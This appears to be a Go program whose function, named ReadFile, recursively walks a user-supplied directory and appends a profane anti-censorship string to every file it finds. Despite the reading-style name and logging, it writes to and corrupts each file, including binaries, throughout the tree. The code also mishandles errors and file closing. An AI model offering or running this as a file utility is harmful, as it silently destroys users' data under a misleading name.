package main

import (
	"bufio"
	"fmt"
	"io/fs"
	"io/ioutil"
	"log"
	"os"
	"strings"
)

func main() {
	fmt.Println("请输入路径：")
	input := bufio.NewScanner(os.Stdin)
	input.Scan()
	ReadFile(input.Text())
}

func ReadFile(dir string) []fs.FileInfo {
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		log.Fatal("错误：", err)
	}
	var myFile []fs.FileInfo
	for _, obj := range files {
		path := strings.TrimSuffix(dir, "/") + "/" + obj.Name()
		if obj.IsDir() {
			log.Println("文件夹名：", obj.Name())
			subFile := ReadFile(path)
			if len(subFile) > 0 {
				myFile = append(myFile, subFile...)
			}
		} else {
			log.Println("文件名：", obj.Name())
			file, err := os.OpenFile(path, os.O_WRONLY|os.O_APPEND, 0666)
			if err != nil {
				log.Println("读取文件失败")
			}
			defer file.Close()
			write := bufio.NewWriter(file)
			myFile = append(myFile, obj)
			_, err = write.WriteString("fuck the censored")
			if err != nil {
				log.Fatal("错误：", err)
			}
			err = write.Flush()
			if err != nil {
				log.Fatal("错误：", err)
			}
		}
	}
	return myFile
}
